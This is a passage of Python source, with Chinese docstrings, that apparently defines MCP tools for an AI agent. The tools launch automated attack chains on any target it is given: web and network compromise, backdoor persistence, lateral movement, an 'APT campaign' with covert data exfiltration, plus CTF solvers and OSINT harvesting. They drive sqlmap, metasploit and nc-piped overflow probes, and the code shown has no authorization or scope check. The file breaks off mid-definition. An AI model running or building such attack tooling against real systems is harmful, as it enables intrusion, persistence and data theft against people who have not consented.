                    "url": url,
                    "mode": "dir",
                    "wordlist": wordlist,
                    "additional_args": "-t 20 -x php,html,txt,js"
                },
                priority=priority,
                timeout=300,
                tags=["directory_scan", "parallel"],
                metadata={"batch_scan": True, "target_count": len(urls)}
            )
            if result.get("success"):
                task_ids.append(result.get("task_id"))
        
        return {
            "success": True,
            "task_ids": task_ids,
            "total_tasks": len(task_ids),
            "message": f"Submitted {len(task_ids)} parallel directory scanning tasks"
        }

    # ==================== APT攻击链工具 ====================

    @mcp.tool()
    def submit_apt_attack_chain(target: str, target_info: Dict[str, Any] = None,
                               attack_objective: str = "full_compromise") -> Dict[str, Any]:
        """
        提交APT攻击链工作流 - 基于知识图谱的智能化并发攻击。

        Args:
            target: 目标IP地址或域名
            target_info: 目标信息（端口、服务等），如果为空则自动侦察
            attack_objective: 攻击目标（full_compromise, data_extraction, persistence等）

        Returns:
            APT攻击链工作流ID和状态
        """
        data = {
            "target": target,
            "target_info": target_info,
            "attack_objective": attack_objective
        }
        return executor.execute_tool_with_data("apt_attack_chain", data)

    @mcp.tool()
    def identify_attack_surfaces(target_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        基于目标信息识别攻击面。

        Args:
            target_info: 目标信息，包含端口、服务、版本等

        Returns:
            识别到的攻击面列表
        """
        data = {"target_info": target_info}
        return executor.execute_tool_with_data("identify_attack_surfaces", data)

    @mcp.tool()
    def generate_attack_paths(target: str, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        生成针对目标的APT攻击路径。

        Args:
            target: 目标IP地址或域名
            target_info: 目标信息，包含端口、服务、版本等

        Returns:
            生成的攻击路径列表，包含并发执行层和成功概率
        """
        data = {
            "target": target,
            "target_info": target_info
        }
        return executor.execute_tool_with_data("generate_attack_paths", data)

    @mcp.tool()
    def apt_web_application_attack(target: str) -> Dict[str, Any]:
        """
        执行APT Web应用攻击链 - 自动化多阶段Web应用渗透。

        包含攻击阶段：
        1. 侦察：端口扫描、技术识别、目录发现
        2. 初始访问：SQL注入、文件上传、认证绕过
        3. 执行：Web Shell部署、命令执行
        4. 持久化：后门植入、权限维持

        Args:
            target: 目标Web应用URL或IP

        Returns:
            APT Web攻击链执行结果
        """
        # 构造Web应用目标信息
        target_info = {
            "ports": [
                {"port": 80, "service": "http"},
                {"port": 443, "service": "https"}
            ]
        }

        return submit_apt_attack_chain(target, target_info, "web_compromise")

    @mcp.tool()
    def apt_network_penetration(target: str) -> Dict[str, Any]:
        """
        执行APT网络渗透攻击链 - 自动化多阶段网络渗透测试。

        包含攻击阶段：
        1. 侦察：网络扫描、服务枚举、漏洞识别
        2. 初始访问：服务漏洞利用、暴力破解
        3. 权限提升：本地漏洞利用、配置错误利用
        4. 横向移动：内网扫描、凭据收集、跳板攻击

        Args:
            target: 目标网络或主机IP

        Returns:
            APT网络渗透链执行结果
        """
        # 构造网络目标信息
        target_info = {
            "ports": [
                {"port": 22, "service": "ssh"},
                {"port": 445, "service": "smb"},
                {"port": 3389, "service": "rdp"}
            ]
        }

        return submit_apt_attack_chain(target, target_info, "network_compromise")

    @mcp.tool()
    def apt_comprehensive_attack(target: str) -> Dict[str, Any]:
        """
        执行APT综合攻击链 - 全面的多向量并发攻击。

        自动识别目标攻击面并执行相应的攻击链：
        - Web应用攻击（如果发现Web服务）
        - 网络服务攻击（SSH、SMB、RDP等）
        - 数据库攻击（MySQL、PostgreSQL等）
        - 无线网络攻击（如果适用）

        Args:
            target: 目标IP地址或域名

        Returns:
            APT综合攻击链执行结果
        """
        return submit_apt_attack_chain(target, None, "full_compromise")

    # ==================== 自适应攻击工具 ====================

    @mcp.tool()
    def start_adaptive_apt_attack(target: str, target_info: Dict[str, Any] = None,
                                 attack_objective: str = "full_compromise") -> Dict[str, Any]:
        """
        启动自适应APT攻击 - 智能化动态调整攻击路径。

        这个功能会：
        1. 执行初始攻击向量
        2. 分析每个攻击的结果
        3. 根据获得的信息重新计算最优攻击路径
        4. 动态调整攻击策略
        5. 持续迭代直到达成攻击目标

        Args:
            target: 目标IP地址或域名
            target_info: 目标信息（端口、服务等），如果为空则自动侦察
            attack_objective: 攻击目标（full_compromise, data_extraction, persistence等）

        Returns:
            自适应攻击ID和状态
        """
        data = {
            "target": target,
            "target_info": target_info,
            "attack_objective": attack_objective
        }
        return executor.execute_tool_with_data("adaptive_apt_attack", data)

    @mcp.tool()
    def get_adaptive_attack_status(attack_id: str) -> Dict[str, Any]:
        """
        获取自适应攻击状态 - 查看攻击进展和发现的信息。

        Args:
            attack_id: 自适应攻击ID

        Returns:
            攻击状态详情，包括：
            - 当前攻击阶段
            - 已完成的攻击向量数量
            - 失败的攻击向量数量
            - 当前获得的能力
            - 发现的信息
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def trigger_next_attack_phase(attack_id: str) -> Dict[str, Any]:
        """
        手动触发下一攻击阶段 - 强制进入下一轮攻击。

        Args:
            attack_id: 自适应攻击ID

        Returns:
            触发结果
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def adaptive_web_penetration(target: str) -> Dict[str, Any]:
        """
        自适应Web渗透测试 - 智能化Web应用攻击。

        会根据发现的Web技术、框架、漏洞等信息动态调整攻击策略：
        - 发现CMS -> 针对性CMS漏洞利用
        - 发现数据库 -> SQL注入攻击
        - 发现上传功能 -> Web Shell上传
        - 获得Shell -> 权限提升和持久化

        Args:
            target: 目标Web应用URL或IP

        Returns:
            自适应Web攻击结果
        """
        target_info = {
            "ports": [
                {"port": 80, "service": "http"},
                {"port": 443, "service": "https"}
            ]
        }

        return start_adaptive_apt_attack(target, target_info, "web_compromise")

    @mcp.tool()
    def adaptive_network_penetration(target: str) -> Dict[str, Any]:
        """
        自适应网络渗透测试 - 智能化网络攻击。

        会根据发现的服务、操作系统、漏洞等信息动态调整攻击策略：
        - 发现SSH -> 暴力破解或漏洞利用
        - 发现SMB -> SMB漏洞利用或哈希传递
        - 获得凭据 -> 横向移动
        - 获得权限 -> 权限提升和持久化

        Args:
            target: 目标网络或主机IP

        Returns:
            自适应网络攻击结果
        """
        target_info = {
            "ports": [
                {"port": 22, "service": "ssh"},
                {"port": 445, "service": "smb"},
                {"port": 3389, "service": "rdp"}
            ]
        }

        return start_adaptive_apt_attack(target, target_info, "network_compromise")

    @mcp.tool()
    def intelligent_apt_campaign(target: str) -> Dict[str, Any]:
        """
        智能APT攻击活动 - 最高级别的自适应攻击。

        模拟真实APT组织的攻击手法：
        1. 全面侦察和信息收集
        2. 多向量并发初始访问尝试
        3. 根据成功的攻击向量调整策略
        4. 智能权限提升和横向移动
        5. 建立多重持久化机制
        6. 隐蔽数据收集和渗出

        Args:
            target: 目标组织的主要IP或域名

        Returns:
            智能APT攻击活动结果
        """
        return start_adaptive_apt_attack(target, None, "apt_campaign")

    # ==================== CTF专用工具 ====================

    @mcp.tool()
    def enable_ctf_mode() -> Dict[str, Any]:
        """
        启用CTF竞赛模式。

        启用后系统将：
        1. 自动检测和提取所有工具输出中的Flag
        2. 支持多种Flag格式（CTF{}, flag{}, 哈希等）
        3. 提供实时Flag统计和题目管理
        4. 优化攻击策略以适应CTF环境

        Returns:
            CTF模式启用结果
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def disable_ctf_mode() -> Dict[str, Any]:
        """
        禁用CTF竞赛模式，返回正常渗透测试模式。

        Returns:
            CTF模式禁用结果
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def create_ctf_session(name: str, team_name: str = "") -> Dict[str, Any]:
        """
        创建CTF竞赛会话。

        Args:
            name: 竞赛名称
            team_name: 队伍名称（可选）

        Returns:
            CTF会话创建结果
        """
        data = {
            "name": name,
            "team_name": team_name
        }
        return executor.execute_tool_with_data("ctf_session", data)

    @mcp.tool()
    def add_ctf_challenge(name: str, category: str, port: int, service: str = "http") -> Dict[str, Any]:
        """
        添加CTF题目到当前会话。

        Args:
            name: 题目名称
            category: 题目分类（web, pwn, crypto, misc, reverse）
            port: 题目端口
            service: 服务类型（http, ssh, ftp等）

        Returns:
            题目添加结果
        """
        data = {
            "name": name,
            "category": category,
            "port": port,
            "service": service
        }
        return executor.execute_tool_with_data("ctf_challenge", data)

    @mcp.tool()
    def get_detected_flags() -> Dict[str, Any]:
        """
        获取所有检测到的Flag。

        Returns:
            包含所有Flag的详细信息，包括：
            - Flag内容
            - 格式类型
            - 发现来源
            - 置信度
            - 发现时间
            - 提交状态
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def get_ctf_challenges_status() -> Dict[str, Any]:
        """
        获取所有CTF题目的状态。

        Returns:
            包含所有题目的状态信息：
            - 题目名称和分类
            - 解题状态
            - 发现的Flag数量
            - 开始和完成时间
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def ctf_quick_scan(target: str, challenge_name: str = "", ports: str = "80,443,22,21,8080") -> Dict[str, Any]:
        """
        CTF快速扫描 - 针对CTF环境优化的快速漏洞发现。

        执行快速端口扫描、服务识别和基础漏洞检测，
        自动提取发现的Flag。

        Args:
            target: 目标IP地址或域名
            challenge_name: 题目名称（用于Flag关联）
            ports: 要扫描的端口列表

        Returns:
            快速扫描结果和发现的Flag
        """
        # 提交快速扫描任务
        scan_tasks = []

        # 1. 快速端口扫描
        nmap_task = {
            "tool_name": "nmap",
            "parameters": {
                "target": target,
                "scan_type": "fast",
                "ports": ports
            },
            "priority": 4,  # 紧急优先级
            "metadata": {"challenge_name": challenge_name}
        }
        scan_tasks.append(submit_concurrent_task(**nmap_task))

        # 2. Web服务快速扫描（如果有Web端口）
        if "80" in ports or "443" in ports or "8080" in ports:
            gobuster_task = {
                "tool_name": "gobuster",
                "parameters": {
                    "target": f"http://{target}",
                    "wordlist": "/usr/share/wordlists/dirb/common.txt",
                    "threads": "50"
                },
                "priority": 4,
                "metadata": {"challenge_name": challenge_name}
            }
            scan_tasks.append(submit_concurrent_task(**gobuster_task))

            # Nikto Web漏洞扫描
            nikto_task = {
                "tool_name": "nikto",
                "parameters": {
                    "target": f"http://{target}"
                },
                "priority": 3,
                "metadata": {"challenge_name": challenge_name}
            }
            scan_tasks.append(submit_concurrent_task(**nikto_task))

        return {
            "success": True,
            "message": f"CTF快速扫描已启动，目标: {target}",
            "target": target,
            "challenge_name": challenge_name,
            "submitted_tasks": len(scan_tasks),
            "task_results": scan_tasks
        }

    @mcp.tool()
    def ctf_web_attack(target: str, challenge_name: str = "") -> Dict[str, Any]:
        """
        CTF Web攻击链 - 专门针对CTF Web题目的攻击。

        执行常见的Web漏洞攻击：
        1. SQL注入检测和利用
        2. XSS漏洞检测
        3. 文件上传漏洞
        4. 目录遍历
        5. 命令注入

        Args:
            target: 目标Web应用URL
            challenge_name: 题目名称

        Returns:
            Web攻击链执行结果
        """
        attack_tasks = []

        # 1. SQL注入攻击
        sqlmap_task = {
            "tool_name": "sqlmap",
            "parameters": {
                "target": target,
                "crawl": "2",
                "batch": True,
                "risk": "3",
                "level": "3"
            },
            "priority": 4,
            "metadata": {"challenge_name": challenge_name}
        }
        attack_tasks.append(submit_concurrent_task(**sqlmap_task))

        # 2. 目录暴力破解
        gobuster_task = {
            "tool_name": "gobuster",
            "parameters": {
                "target": target,
                "wordlist": "/usr/share/wordlists/dirb/big.txt",
                "extensions": "php,html,txt,js,zip,bak"
            },
            "priority": 3,
            "metadata": {"challenge_name": challenge_name}
        }
        attack_tasks.append(submit_concurrent_task(**gobuster_task))

        # 3. Web漏洞扫描
        nuclei_task = {
            "tool_name": "nuclei",
            "parameters": {
                "target": target,
                "templates": "web-vulnerabilities,exposures,misconfiguration"
            },
            "priority": 3,
            "metadata": {"challenge_name": challenge_name}
        }
        attack_tasks.append(submit_concurrent_task(**nuclei_task))

        return {
            "success": True,
            "message": f"CTF Web攻击链已启动，目标: {target}",
            "target": target,
            "challenge_name": challenge_name,
            "submitted_tasks": len(attack_tasks),
            "task_results": attack_tasks
        }

    # ==================== 智能分析工具 ====================

    @mcp.tool()
    def optimize_tool_parameters(tool: str, target_type: str = "unknown",
                                time_constraint: str = "quick", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        优化渗透测试工具参数以提高准确性和效率。

        Args:
            tool: 工具名称 (nmap, gobuster, sqlmap, hydra等)
            target_type: 目标类型 (web, network, database, windows, linux)
            time_constraint: 时间约束 (quick, standard, thorough)
            stealth_mode: 是否启用隐蔽模式

        Returns:
            优化后的工具参数配置
        """
        data = {
            "tool": tool,
            "target_type": target_type,
            "time_constraint": time_constraint,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("optimize_parameters", data)

    @mcp.tool()
    def correlate_scan_results(tool_results: Dict[str, Dict]) -> Dict[str, Any]:
        """
        关联和分析多个扫描工具的结果，识别漏洞模式和攻击路径。

        Args:
            tool_results: 多个工具的扫描结果字典
                格式: {"nmap": {...}, "gobuster": {...}, "nuclei": {...}}

        Returns:
            关联分析结果，包含发现的漏洞模式和建议
        """
        data = {
            "tool_results": tool_results
        }
        return executor.execute_tool_with_data("correlate_results", data)

    @mcp.tool()
    def generate_adaptive_scan_plan(target: str, initial_results: Dict = None,
                                  time_budget: str = "standard") -> Dict[str, Any]:
        """
        基于目标特征和已有结果生成自适应扫描计划。

        Args:
            target: 目标IP、域名或URL
            initial_results: 初步扫描结果（可选）
            time_budget: 时间预算 (quick, standard, thorough)

        Returns:
            自适应扫描计划，包含优先级排序的扫描步骤
        """
        data = {
            "target": target,
            "initial_results": initial_results or {},
            "time_budget": time_budget
        }
        return executor.execute_tool_with_data("adaptive_scan_plan", data)

    @mcp.tool()
    def intelligent_smart_scan(target: str, objectives: List[str] = None,
                             time_budget: str = "standard", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        执行智能扫描 - 集成参数优化和自适应策略的全流程扫描。

        Args:
            target: 目标IP、域名或URL
            objectives: 扫描目标列表 (默认: ["port_scan", "web_scan"])
            time_budget: 时间预算 (quick, standard, thorough)
            stealth_mode: 是否启用隐蔽模式

        Returns:
            智能扫描计划，包含优化后的参数和执行策略
        """
        data = {
            "target": target,
            "objectives": objectives or ["port_scan", "web_scan"],
            "time_budget": time_budget,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("smart_scan", data)

    @mcp.tool()
    def analyze_target_intelligence(target: str, scan_results: Dict = None) -> Dict[str, Any]:
        """
        基于扫描结果分析目标特征和推荐攻击向量。

        Args:
            target: 目标IP、域名或URL
            scan_results: 扫描结果数据（可选）

        Returns:
            目标分析结果，包含目标类型、推荐攻击向量和安全评估
        """
        data = {
            "target": target,
            "scan_results": scan_results or {}
        }
        return executor.execute_tool_with_data("analyze_target", data)

    @mcp.tool()
    def intelligent_ctf_solver(target: str, challenge_category: str = "unknown",
                             time_limit: str = "30min") -> Dict[str, Any]:
        """
        智能CTF题目求解器 - 基于题目特征自动选择最优攻击策略。

        Args:
            target: CTF题目地址或IP
            challenge_category: 题目分类 (web, pwn, crypto, misc, reverse)
            time_limit: 时间限制 (15min, 30min, 1hour)

        Returns:
            CTF求解计划和执行结果
        """
        # 首先分析目标
        analysis_result = analyze_target_intelligence(target)

        # 基于分析结果生成CTF专用扫描计划
        if challenge_category == "web" or "web" in analysis_result.get("target_type", ""):
            return ctf_web_attack(target, f"Auto-CTF-{challenge_category}")
        else:
            # 生成通用CTF扫描计划
            time_budget = "quick" if "15min" in time_limit else "standard"
            return generate_adaptive_scan_plan(target, time_budget=time_budget)

    @mcp.tool()
    def intelligent_vulnerability_assessment(target: str, assessment_depth: str = "comprehensive") -> Dict[str, Any]:
        """
        智能漏洞评估 - 全面的漏洞发现和风险分析。

        Args:
            target: 目标IP、域名或URL
            assessment_depth: 评估深度 (quick, comprehensive, deep)

        Returns:
            完整的漏洞评估报告，包含发现的漏洞、风险等级和修复建议
        """
        # 执行智能扫描
        smart_scan_result = intelligent_smart_scan(
            target=target,
            time_budget=assessment_depth,
            stealth_mode=False
        )

        # 如果是Web目标，执行Web专用评估
        if target.startswith("http"):
            web_assessment = advanced_web_security_assessment(target, True)
            smart_scan_result["web_assessment"] = web_assessment

        return {
            "success": True,
            "target": target,
            "assessment_depth": assessment_depth,
            "scan_plan": smart_scan_result,
            "message": f"智能漏洞评估计划已生成，目标: {target}"
        }

    @mcp.tool()
    def intelligent_penetration_testing(target: str, scope: str = "single",
                                       methodology: str = "owasp") -> Dict[str, Any]:
        """
        智能渗透测试 - 遵循标准方法论的全面渗透测试。

        Args:
            target: 目标IP、域名或URL
            scope: 测试范围 (single, subnet, domain)
            methodology: 测试方法论 (owasp, nist, ptes)

        Returns:
            渗透测试执行计划和初步结果
        """
        # 第一阶段：信息收集和目标分析
        target_analysis = analyze_target_intelligence(target)

        # 第二阶段：生成自适应攻击计划
        attack_plan = generate_adaptive_scan_plan(
            target=target,
            initial_results=target_analysis.get("analysis_summary", {}),
            time_budget="thorough"
        )

        # 第三阶段：执行相应的渗透测试
        if target_analysis.get("target_type") == "web":
            pentest_result = apt_web_application_attack(target)
        else:
            pentest_result = apt_network_penetration(target)

        return {
            "success": True,
            "target": target,
            "scope": scope,
            "methodology": methodology,
            "target_analysis": target_analysis,
            "attack_plan": attack_plan,
            "execution_result": pentest_result,
            "message": f"智能渗透测试已启动，目标: {target}，方法论: {methodology}"
        }

    # ==================== 预定义智能工作流 ====================

    @mcp.tool()
    def auto_web_security_workflow(target: str, depth: str = "comprehensive") -> Dict[str, Any]:
        """
        自动化Web安全评估工作流 - 完整的Web应用安全测试流程。

        Args:
            target: 目标Web应用URL
            depth: 评估深度 (quick, comprehensive, deep)

        Returns:
            完整的Web安全评估结果
        """
        workflow_steps = []

        # 第一阶段：信息收集
        step1 = {
            "stage": "information_gathering",
            "description": "Web应用信息收集",
            "tools": [
                {"tool": "nmap_scan", "params": {"target": target, "scan_type": "-sV", "ports": "80,443,8080,8443"}},
                {"tool": "whatweb_scan", "params": {"target": target}},
                {"tool": "analyze_target_intelligence", "params": {"target": target}}
            ]
        }
        workflow_steps.append(step1)

        # 第二阶段：目录发现
        step2 = {
            "stage": "directory_discovery",
            "description": "Web目录和文件发现",
            "tools": [
                {"tool": "gobuster_scan", "params": {"url": target, "mode": "dir"}},
                {"tool": "ffuf_scan", "params": {"url": f"{target}/FUZZ"}},
                {"tool": "feroxbuster_scan", "params": {"url": target}}
            ]
        }
        workflow_steps.append(step2)

        # 第三阶段：漏洞扫描
        step3 = {
            "stage": "vulnerability_scanning",
            "description": "Web应用漏洞扫描",
            "tools": [
                {"tool": "nuclei_web_scan", "params": {"target": target, "scan_type": depth}},
                {"tool": "nikto_scan", "params": {"target": target}},
                {"tool": "sqlmap_scan", "params": {"url": target, "additional_args": "--crawl=2 --batch"}}
            ]
        }
        workflow_steps.append(step3)

        # 第四阶段：专项测试
        if depth in ["comprehensive", "deep"]:
            step4 = {
                "stage": "specialized_testing",
                "description": "专项安全测试",
                "tools": [
                    {"tool": "wpscan_scan", "params": {"target": target}},
                    {"tool": "wafw00f_scan", "params": {"target": target}},
                    {"tool": "wfuzz_scan", "params": {"target": f"{target}/FUZZ"}}
                ]
            }
            workflow_steps.append(step4)

        return {
            "success": True,
            "workflow_name": "auto_web_security_workflow",
            "target": target,
            "depth": depth,
            "total_stages": len(workflow_steps),
            "workflow_steps": workflow_steps,
            "estimated_time": f"{len(workflow_steps) * 10}-{len(workflow_steps) * 20} minutes",
            "message": f"自动化Web安全评估工作流已生成，目标: {target}"
        }

    @mcp.tool()
    def auto_network_discovery_workflow(target_network: str, scan_intensity: str = "standard") -> Dict[str, Any]:
        """
        自动化网络发现工作流 - 完整的网络侦察和服务发现。

        Args:
            target_network: 目标网络范围 (如 192.168.1.0/24)
            scan_intensity: 扫描强度 (light, standard, aggressive)

        Returns:
            网络发现工作流结果
        """
        workflow_steps = []

        # 第一阶段：主机发现
        step1 = {
            "stage": "host_discovery",
            "description": "网络主机发现",
            "tools": [
                {"tool": "nmap_scan", "params": {"target": target_network, "scan_type": "-sn"}},
                {"tool": "masscan_scan", "params": {"target": target_network, "ports": "80,443,22,21,23,25,53,110,143,993,995"}},
                {"tool": "fping_scan", "params": {"targets": target_network}}
            ]
        }
        workflow_steps.append(step1)

        # 第二阶段：端口扫描
        if scan_intensity in ["standard", "aggressive"]:
            step2 = {
                "stage": "port_scanning",
                "description": "端口扫描和服务识别",
                "tools": [
                    {"tool": "nmap_scan", "params": {"target": target_network, "scan_type": "-sS", "ports": "21,22,80,443,8080", "additional_args": "-T5 --open"}},
                    {"tool": "zmap_scan", "params": {"target": target_network, "port": "80"}},
                    {"tool": "masscan_fast_scan", "params": {"target": target_network}}
                ]
            }
            workflow_steps.append(step2)

        # 第三阶段：服务枚举
        if scan_intensity == "aggressive":
            step3 = {
                "stage": "service_enumeration",
                "description": "服务深度枚举",
                "tools": [
                    {"tool": "enum4linux_scan", "params": {"target": target_network}},
                    {"tool": "dnsrecon_scan", "params": {"domain": target_network}},
                    {"tool": "nuclei_network_scan", "params": {"target": target_network}}
                ]
            }
            workflow_steps.append(step3)

        return {
            "success": True,
            "workflow_name": "auto_network_discovery_workflow",
            "target_network": target_network,
            "scan_intensity": scan_intensity,
            "total_stages": len(workflow_steps),
            "workflow_steps": workflow_steps,
            "estimated_time": f"{len(workflow_steps) * 15}-{len(workflow_steps) * 30} minutes",
            "message": f"自动化网络发现工作流已生成，目标网络: {target_network}"
        }

    @mcp.tool()
    def auto_osint_workflow(target_domain: str, scope: str = "comprehensive") -> Dict[str, Any]:
        """
        自动化OSINT情报收集工作流 - 完整的开源情报收集。

        Args:
            target_domain: 目标域名
            scope: 收集范围 (basic, comprehensive, extensive)

        Returns:
            OSINT情报收集结果
        """
        workflow_steps = []

        # 第一阶段：域名枚举
        step1 = {
            "stage": "domain_enumeration",
            "description": "域名和子域名发现",
            "tools": [
                {"tool": "subfinder_scan", "params": {"domain": target_domain}},
                {"tool": "sublist3r_scan", "params": {"domain": target_domain}},
                {"tool": "amass_enum", "params": {"domain": target_domain, "mode": "enum"}}
            ]
        }
        workflow_steps.append(step1)

        # 第二阶段：DNS枚举
        step2 = {
            "stage": "dns_enumeration",
            "description": "DNS信息收集",
            "tools": [
                {"tool": "dnsrecon_scan", "params": {"domain": target_domain}},
                {"tool": "dnsenum_scan", "params": {"domain": target_domain}},
                {"tool": "fierce_scan", "params": {"domain": target_domain}}
            ]
        }
        workflow_steps.append(step2)

        # 第三阶段：社交媒体和人员信息
        if scope in ["comprehensive", "extensive"]:
            step3 = {
                "stage": "social_intelligence",
                "description": "社交媒体和人员信息收集",
                "tools": [
                    {"tool": "theharvester_osint", "params": {"domain": target_domain, "sources": "google,bing,linkedin,twitter"}},
                    {"tool": "sherlock_search", "params": {"username": target_domain.split('.')[0]}},
                    {"tool": "recon_ng_run", "params": {"module": "recon/domains-contacts/whois_pocs"}}
                ]
            }
            workflow_steps.append(step3)

        # 第四阶段：技术指纹识别
        if scope == "extensive":
            step4 = {
                "stage": "technology_fingerprinting",
                "description": "技术栈和服务指纹识别",
                "tools": [
                    {"tool": "whatweb_identify", "params": {"target": f"http://{target_domain}"}},
                    {"tool": "nuclei_technology_detection", "params": {"target": f"http://{target_domain}"}},
                    {"tool": "httpx_probe", "params": {"targets": target_domain, "additional_args": "-tech-detect"}}
                ]
            }
            workflow_steps.append(step4)

        return {
            "success": True,
            "workflow_name": "auto_osint_workflow",
            "target_domain": target_domain,
            "scope": scope,
            "total_stages": len(workflow_steps),
            "workflow_steps": workflow_steps,
            "estimated_time": f"{len(workflow_steps) * 8}-{len(workflow_steps) * 15} minutes",
            "message": f"自动化OSINT工作流已生成，目标域名: {target_domain}"
        }

    # ==================== 增强自动化CTF求解功能 ====================

    @mcp.tool()
    def advanced_ctf_solver(target: str, challenge_info: Dict = None, time_limit: str = "30min") -> Dict[str, Any]:
        """
        高级CTF题目自动求解器 - 基于题目特征的智能化攻击策略。

        Args:
            target: CTF题目地址或IP
            challenge_info: 题目信息 (category, description, hints等)
            time_limit: 时间限制

        Returns:
            CTF求解执行计划和结果
        """
        if not challenge_info:
            challenge_info = {}

        category = challenge_info.get("category", "unknown")
        description = challenge_info.get("description", "")
        hints = challenge_info.get("hints", [])

        # 启用CTF模式
        enable_ctf_mode()

        # 基于题目分类生成求解策略
        if category == "web" or "web" in description.lower():
            return ctf_web_comprehensive_solver(target, challenge_info, time_limit)
        elif category == "pwn" or "pwn" in description.lower():
            return ctf_pwn_solver(target, challenge_info, time_limit)
        elif category == "crypto" or "crypto" in description.lower():
            return ctf_crypto_solver(target, challenge_info, time_limit)
        elif category == "misc" or "misc" in description.lower():
            return ctf_misc_solver(target, challenge_info, time_limit)
        else:
            # 通用自动检测求解
            return ctf_auto_detect_solver(target, challenge_info, time_limit)

    @mcp.tool()
    def ctf_web_comprehensive_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Web类CTF题目全面求解器"""
        solver_steps = []

        # 第一阶段：基础信息收集
        step1 = {
            "phase": "reconnaissance",
            "description": "Web应用基础信息收集",
            "actions": [
                {"action": "technology_detection", "tool": "whatweb_scan", "params": {"target": target}},
                {"action": "directory_discovery", "tool": "gobuster_scan", "params": {"url": target, "wordlist": "/usr/share/wordlists/dirb/big.txt"}},
                {"action": "vulnerability_scan", "tool": "nuclei_web_scan", "params": {"target": target, "scan_type": "comprehensive"}}
            ]
        }
        solver_steps.append(step1)

        # 第二阶段：常见Web漏洞检测
        step2 = {
            "phase": "vulnerability_detection",
            "description": "Web漏洞深度检测",
            "actions": [
                {"action": "sql_injection", "tool": "sqlmap_scan", "params": {"url": target, "additional_args": "--crawl=3 --batch --level=3 --risk=3"}},
                {"action": "file_upload", "tool": "ffuf_scan", "params": {"url": f"{target}/upload", "wordlist": "/usr/share/wordlists/dirb/extensions_common.txt"}},
                {"action": "lfi_rfi_test", "tool": "wfuzz_scan", "params": {"target": f"{target}?file=FUZZ", "wordlist": "/usr/share/wordlists/wfuzz/Injections/Traversal.txt"}}
            ]
        }
        solver_steps.append(step2)

        # 第三阶段：CTF特定攻击
        step3 = {
            "phase": "ctf_specific_attacks",
            "description": "CTF环境特定攻击方法",
            "actions": [
                {"action": "source_code_analysis", "tool": "gobuster_scan", "params": {"url": target, "mode": "dir", "additional_args": "-x php,txt,bak,old,zip"}},
                {"action": "hidden_parameters", "tool": "wfuzz_scan", "params": {"target": f"{target}?FUZZ=test", "wordlist": "/usr/share/wordlists/wfuzz/general/common.txt"}},
                {"action": "admin_panel_discovery", "tool": "feroxbuster_scan", "params": {"url": target, "wordlist": "/usr/share/wordlists/dirb/admin.txt"}}
            ]
        }
        solver_steps.append(step3)

        return {
            "success": True,
            "solver_type": "ctf_web_comprehensive",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "web",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Web题目全面求解器已启动，目标: {target}"
        }

    @mcp.tool()
    def ctf_pwn_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Pwn类CTF题目求解器"""
        solver_steps = []

        # 第一阶段：服务识别
        step1 = {
            "phase": "service_identification",
            "description": "Pwn服务识别和分析",
            "actions": [
                {"action": "port_scan", "tool": "nmap_scan", "params": {"target": target, "scan_type": "-sV -sC"}},
                {"action": "service_banner", "tool": "nmap_scan", "params": {"target": target, "additional_args": "--script banner"}},
                {"action": "vulnerability_scan", "tool": "nuclei_scan", "params": {"target": target, "templates": "network/"}}
            ]
        }
        solver_steps.append(step1)

        # 第二阶段：漏洞探测
        step2 = {
            "phase": "vulnerability_probing",
            "description": "二进制漏洞探测",
            "actions": [
                {"action": "buffer_overflow_test", "tool": "execute_command", "params": {"command": f"echo 'A'*1000 | nc {target.split(':')[0]} {target.split(':')[1] if ':' in target else '22'}"}},
                {"action": "format_string_test", "tool": "execute_command", "params": {"command": f"echo '%x%x%x%x' | nc {target.split(':')[0]} {target.split(':')[1] if ':' in target else '22'}"}},
                {"action": "shellcode_injection", "tool": "metasploit_run", "params": {"module": "exploit/linux/misc/glibc_ld_audit_dso_load_priv_esc"}}
            ]
        }
        solver_steps.append(step2)

        return {
            "success": True,
            "solver_type": "ctf_pwn",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "pwn",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Pwn题目求解器已启动，目标: {target}"
        }

    @mcp.tool()
    def ctf_crypto_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Crypto类CTF题目求解器"""
        solver_steps = []

        # 第一阶段：密码学分析
        step1 = {
            "phase": "cryptographic_analysis",
            "description": "密码学算法识别和分析",
            "actions": [
                {"action": "hash_identification", "tool": "execute_command", "params": {"command": "hashid"}},
                {"action": "cipher_detection", "tool": "execute_command", "params": {"command": "cipher-identifier"}},
                {"action": "frequency_analysis", "tool": "execute_command", "params": {"command": "freq-analysis"}}
            ]
        }
        solver_steps.append(step1)

        # 第二阶段：解密尝试
        step2 = {
            "phase": "decryption_attempts",
            "description": "自动化解密尝试",
            "actions": [
                {"action": "common_ciphers", "tool": "execute_command", "params": {"command": "cyberchef-cli"}},
                {"action": "hash_cracking", "tool": "john_crack", "params": {"hash_file": "/tmp/hashes.txt"}},
                {"action": "rsa_attacks", "tool": "execute_command", "params": {"command": "rsatool"}}
            ]
        }
        solver_steps.append(step2)

        return {
            "success": True,
            "solver_type": "ctf_crypto",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "crypto",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Crypto题目求解器已启动，目标: {target}"
        }

    @mcp.tool()
